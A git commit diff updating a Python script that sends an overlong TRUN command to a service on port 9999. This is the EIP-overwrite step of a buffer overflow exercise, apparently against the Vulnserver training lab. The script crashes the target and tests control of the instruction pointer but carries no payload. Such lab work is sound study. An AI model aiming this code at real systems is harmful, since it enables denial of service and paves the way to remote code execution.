8d8fac7ab04c1392642723a18c7282c65fa3d02d
Shamsher khan <32321996+shamsherkhan852@users.noreply.github.com>
2023-08-07 17:31:25 +0530

    3-overwriteEIP.py

--- 3-overwriteEIP.py
+++ 3-overwriteEIP.py
@@ -1,16 +1,15 @@
-#!/usr/bin/python
-
 import socket
 import sys
 
-shellcode = "A" * 2003 + "B" * 4
+shellcode = b"A" * 2003 + b"B" * 4
 
 try:
-	s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	connect =  s.connect(('192.168.43.112',9999))
-	s.send(('TRUN /.:/' + shellcode))
-	print("Fuzzing with TRUN command %s bytes"% str(len(shellcode)))
-	s.close()
-except:
-	print("Error connecting to server")
-	sys.exit()
+    ip_address = input("Enter the server IP address: ")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect((ip_address, 9999))
+    s.send((b'TRUN /.:/' + shellcode))
+    print("Fuzzing with TRUN command %s bytes" % str(len(shellcode)))
+    s.close()
+except Exception as e:
+    print("Error connecting to server:", e)
+    sys.exit()
